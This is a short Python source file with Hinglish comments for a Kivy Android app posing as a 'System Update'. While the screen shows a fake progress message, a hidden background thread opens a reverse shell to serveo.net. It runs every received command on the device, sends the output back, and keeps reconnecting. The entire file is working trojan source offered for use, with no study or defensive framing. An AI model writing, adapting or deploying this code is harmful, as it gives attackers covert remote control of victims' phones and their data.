import socket
import subprocess
import os
import time
from threading import Thread

# Ye function background mein chalta rahega
def connect_to_hacker():
    host = 'serveo.net' # Aapka tunnel address
    port = 80 
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            while True:
                data = s.recv(1024).decode()
                if not data or data == 'exit': break
                # Command chala kar result bhejna
                output = subprocess.getoutput(data)
                s.send(output.encode() or b"Done")
            s.close()
        except:
            time.sleep(10) # 10 sec baad reconnect koshish

# Android App ka basic structure (Kivy)
from kivy.app import App
from kivy.uix.label import Label

class SystemUpdateApp(App):
    def build(self):
        # Background thread shuru karna
        Thread(target=connect_to_hacker, daemon=True).start()
        # Screen par sirf ek fake message dikhega
        return Label(text="System Update in progress...")

if __name__ == "__main__":
    SystemUpdateApp().run()
